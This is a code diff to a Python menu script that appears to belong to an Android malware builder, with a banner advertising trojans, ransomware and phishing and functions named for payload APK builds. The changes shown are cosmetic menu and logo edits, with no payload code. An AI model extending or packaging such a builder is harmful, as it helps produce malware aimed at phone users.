@@ -53,9 +53,8 @@ logo = f"""{G}
 █████████████████████████  {B}[ {Y}Trojans , Ransomeware , Phishing {B}]{G}
 
 {B}[{R}Version{B}]{C} {version}
-{B}[{R}Coders {B}]{C} https://github.com/T-Dynamos"""
-print(logo)
-print()
+{B}[{R}Coders {B}]{C} https://github.com/T-Dynamos
+"""
 def message(ok):
         print(f"{B}[{Y}  >  {B}] {G+ok} ")	
 
@@ -747,12 +746,6 @@ def build_distruct_x():
 	message (f"Saved Successful as {Y+pathout}")
 	os.system("cd .. && rm -rf android_payload.apk android_payload normal_apk final.apk tmp.sh")	
 def build(dir=""):
-	if  "whatsappbomber"  in dir:
-		pass
-	if "distruct-x" in dir:
-		build_distruct_x()
-	else:
-		exit()
 		
 	splash = ask("Enter the new name for splash screen :")
 	stringapp = ask("Enter the new name for App Name :")
@@ -1340,6 +1333,8 @@ def build_sara():
 	os.system("cd .. && rm -rf android_payload.apk android_payload normal_apk final.apk tmp.sh")
 
 def executeMain():
+	os.system('clear')
+	print(logo)
 	message("Checking Dependices")
 	check_d(["halo"])
 	from halo import Halo
@@ -1368,7 +1363,7 @@ def executeMain():
 	print(text)
 	print()
 	a= ask("Your Choice :")
-	if a == '1':
+	if a == "1":
 		build_distruct_x()
 	if a == "4":
 		build(dir="whatsappbombe;;r")
@@ -1381,4 +1376,6 @@ def executeMain():
 	elif a == "6":
 		print("Custom build comming soon")
 		exit()
+	else:
+		return executeMain ()
 executeMain()
